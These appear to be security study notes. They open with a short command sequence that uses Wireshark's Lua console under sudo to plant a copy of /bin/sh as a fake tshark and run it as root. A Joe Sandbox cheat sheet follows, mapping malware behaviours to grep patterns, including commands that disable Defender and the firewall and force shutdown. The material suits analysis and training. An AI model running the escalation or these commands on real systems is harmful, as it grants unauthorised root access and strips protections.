```
sudo wireshark &
Tools -> Lua Console
os.execute("mkdir -p /user/bin")
os.execute("cp /bin/sh /user/bin/tshark")

sudo /user/bin/tshark
```

# Joe Sandbox
##Start at System Summary  

| Behavior                                                                                   | Search queries / things to grep for in the report                                                                                                                           |                              Joe Sandbox Signature Category |
| ------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------: |
| Attempts to get the victim to disable security protections                                 | `Disable`, `disable-defender`, `DisableAntiSpyware`, `Set-MpPreference -DisableRealtimeMonitoring`, `Stop-Service WinDefend`, `netsh advfirewall set allprofiles state off` | Lowering of HIPS / PFW / Operating System Security Settings |
| Deletes Microsoft Office-related registry keys                                             | `HKLM\\SOFTWARE\\Microsoft\\Office`, `HKCU\\Software\\Microsoft\\Office`, `RegDeleteValue`, `RegDeleteKey`, `NtDeleteKey`                                                   |                       Persistence and Installation Behavior |
| Creates registry keys associated with Microsoft Excel                                      | `Excel`, `Microsoft\\Office\\.*Excel`, `RegCreateKeyEx`, `RegSetValueEx`, `HKCU\\Software\\Microsoft\\Office`                                                               |                       Persistence and Installation Behavior |
| Creates any registry values                                                                | `RegSetValueEx`, `RegSetValue`, `NtSetValueKey`, `reg add`, `Set-ItemProperty`                                                                                              |                       Persistence and Installation Behavior |
| Drops RegAsm virus                                                                         | `regasm.exe`, `RegAsm`, dropped file name contains `regasm`, `CreateFile` -> `%TEMP%\\regasm*.exe`, PE write to disk                                                        |                                                   Spreading |
| Sends signals to force immediate program termination                                       | `TerminateProcess`, `ExitProcess`, `TerminateThread`, `taskkill`, `GenerateConsoleCtrlEvent`                                                                                |                             Malware Analysis System Evasion |
| Malware file is most likely programmed in C or C++                                         | Imports: `msvcrt`, `vcruntime`, `msvcp`, mangled symbols `_Z`, `__cplusplus`, `PE -> compiled with MSVC`                                                                    |                                              System Summary |
| Attempts to detect presence of the Mirai botnet                                            | `mirai`, `TELNET`, `port 23`, `2323`, `brute`, `telnet-scanner`, `high-rate connect attempts`                                                                               |                                                  Networking |
| Attempts to use a keylogger                                                                | `SetWindowsHookEx`, `WH_KEYBOARD_LL`, `GetAsyncKeyState`, `GetKeyState`, files named `keylog`, `WriteFile` to logs                                                          |      Key, Mouse, Clipboard, Microphone and Screen Capturing |
| Attempts to copy clipboard contents                                                        | `OpenClipboard`, `GetClipboardData`, `CF_UNICODETEXT`, `Get-Clipboard`, `OleGetClipboard`                                                                                   |      Key, Mouse, Clipboard, Microphone and Screen Capturing |
| Hooks registry keys or values to maintain persistence via autostart                        | `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`, `RunOnce`, `Winlogon`, `RegSetValueEx` writing to `Run`                                                          |                       Persistence and Installation Behavior |
| Possible Personal Firewall (PFW) or Host-based Intrusion Prevention System (HIPS) evasion  | `AmsiScanBuffer` patch, `EtwEventWrite` tampering, `NtProtectVirtualMemory`, `Unhook`, `IsDebuggerPresent`                                                                  |            HIPS / PFW / Operating System Protection Evasion |
| Executes or interacts with `splwow64.exe` (Windows system component)                       | process name `splwow64.exe`, `OpenProcess`/`CreateProcess` targeting `splwow64.exe`, `WriteProcessMemory` -> `splwow64.exe`                                                 |                                 Remote Access Functionality |
| Drops a portable executable file into `C:\\Windows` (drops only)                           | `CreateFile` / `WriteFile` / `MoveFile` -> `C:\\Windows\\.*\\.exe`, `CopyFile` to `C:\\Windows\\`                                                                           |                                                   Spreading |
| Looks for the name or serial number of a device                                            | `Win32_BIOS`, `SerialNumber`, `GetVolumeInformation`, `GetComputerName`, `DeviceIoControl`, `Model`, `Manufacturer`                                                         |             Language, Device and Operating System Detection |
| Attempts to obscure data (encoding, encryption, obfuscation)                               | `base64`, `Convert.FromBase64String`, `XOR`, `CryptEncrypt`, `BCryptEncrypt`, high-entropy blobs, long `xor` loops                                                          |                                            Data Obfuscation |
| Sends HTTP GET or POST requests without a User-Agent header                                | HTTP requests where `User-Agent:` missing or empty; raw socket `GET / HTTP/1.1` without `User-Agent` header                                                                 |                                                  Networking |
| Uses loops or repeated commands (e.g., pings) to delay execution or evade sandbox analysis | `Sleep(`, `NtDelayExecution`, `ping -n`, repeated `ping`, `for`/`while` loops with `Sleep(5000+)`                                                                           |                             Malware Analysis System Evasion |
| Attempts to override DNS resolution for a specific domain on the local machine             | writes to `C:\\Windows\\System32\\drivers\\etc\\hosts`, `Set-DnsClientServerAddress`, `reg add` DNS entries, `netsh interface ip add dns`                                   |                                                  Networking |
| Possible system shutdown behavior                                                          | `ExitWindowsEx`, `InitiateSystemShutdownEx`, `Shutdown`, `ExitProcess`, `CreateProcess` running `shutdown.exe /s /t 0`                                                      |            HIPS / PFW / Operating System Protection Evasion |

---
